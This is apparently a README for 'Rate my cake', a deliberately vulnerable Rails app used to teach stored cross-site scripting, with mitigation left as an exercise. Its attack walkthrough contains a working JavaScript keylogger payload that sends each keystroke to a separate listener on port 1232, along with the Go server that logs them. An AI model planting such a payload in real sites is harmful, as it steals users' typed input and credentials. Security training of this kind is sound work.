# Rate my cake 🍰

<p align="center">
    <img src="images/01.png"/>
</p>

Rate my cake is a Rails web application where you rate the freshly baked rainbow cake of Mr cakelover and leave a kind message. The application has a problem though, it has XSS vulnerabilities.

## Index

- [Rate my cake 🍰](#rate-my-cake-)
  - [Index](#index)
  - [What is Cross-Site Scripting?](#what-is-cross-site-scripting)
  - [Setup](#setup)
  - [Get to know the app](#get-to-know-the-app)
  - [Attack narrative](#attack-narrative)
    - [🔥](#)
  - [Secure this app](#secure-this-app)
  - [PR solutions](#pr-solutions)
  - [Contributing](#contributing)

## What is Cross-Site Scripting?

XSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.

The main goal of this app is to discuss how **Cross-Site Scripting** vulnerabilities can be exploited and to encourage developers to send secDevLabs Pull Requests on how they would mitigate these flaws.

## Setup

To start this intentionally **insecure application**, you will need [Docker][docker install] and [Docker Compose][docker compose install]. After forking [secDevLabs](https://github.com/globocom/secDevLabs), you must type the following commands to start:

```sh
cd secDevLabs/owasp-top10-2021-apps/a3/rate-my-cake
```

```sh
make install
```

Then simply visit [localhost:3000][app] ! 😆

## Get to know the app

This application is designed to be the most straight forward as possible so no user creation is required.

- Access localhost:3000
- Leave your rate to Mr Cakelover

## Attack narrative

Now that you know the purpose of this app, what could go wrong? The following section describes how an attacker could identify and eventually find sensitive information about the app or its users. We encourage you to follow these steps and try to reproduce them on your own to better understand the attack vector! 😜

So lets leave a rate to Mr Cakelover

Adding a new rate:
<img src="images/02.png" align="center"/>
<small>Click on 'Leave a rate' button</small>

Let's try out something and test if the application is skipping html code on comments:

<img src="images/03.png" align="center"/>

<small> Surround the `Love It` (or anything you like) with a `<b>` (bold) tag and click `Submit`. A visualization screen will appear, click `Back` to get back to the index </small>

Ok, lets check the result:

<img src="images/04.png" align="center"/>

<small>Yeap ! It looks like the developer has committed a very common mistake and forgot to skip the HTML code on the comment input.
This leaves space for a malicious attacker to inject Javascript code into the application.</small>

### 🔥

An attacker may abuse these flaws by generating a malicious JS code and sending it to other users. To demonstrate this, the following example will get all keyboard input from a user by persisting a malicious code in the server.

First, the following Golang API can be built (main.go) that logs all received requests:

```go
package main

import (
   "fmt"
   "github.com/labstack/echo"
)

func main() {
   e := echo.New()
   e.GET("/:k", handler)
   e.Logger.Fatal(e.Start(":1232"))
}

func handler(c echo.Context) error {
   fmt.Println(c.Request().RemoteAddr, c.Param("k"))
   return nil
}
```

To run this code simply type the following command in your terminal (you should check this [guide](https://golang.org/doc/install) if you need any help with Golang):

```sh
go run main.go
```

Then, the attacker can insert a new post through the **/rates/new** route by using the following code in the text field:

```html
<script>
  var k = "";
  document.onkeypress = function (e) {
    e = e || window.event;
    k += e.key;
    var i = new Image();
    i.src = "http://localhost:1232/" + k;
  };
</script>
```

This code implements a keylogger to capture all keyboard input from users and send it to the API created beforehand.

The attacker now gets all the input on the server log, as shown below:

<img src="images/05.png" align="center"/>

## Secure this app

How would you mitigate this vulnerability? After your changes, an attacker should not be able to:

- Execute scripts through input fields

## PR solutions

[Spoiler alert 🚨] To understand how this vulnerability can be mitigated, check out [these pull requests](https://github.com/globocom/secDevLabs/pulls?q=is%3Apr+label%3A%22mitigation+solution+%F0%9F%94%92%22+label%3A%22Gossip+World%22)!

## Contributing

We encourage you to contribute to SecDevLabs! Please check out the [Contributing to SecDevLabs](../../../docs/CONTRIBUTING.md) section for guidelines on how to proceed! 🎉

[docker install]: https://docs.docker.com/install/
[docker compose install]: https://docs.docker.com/compose/install/
[app]: http://localhost:10007
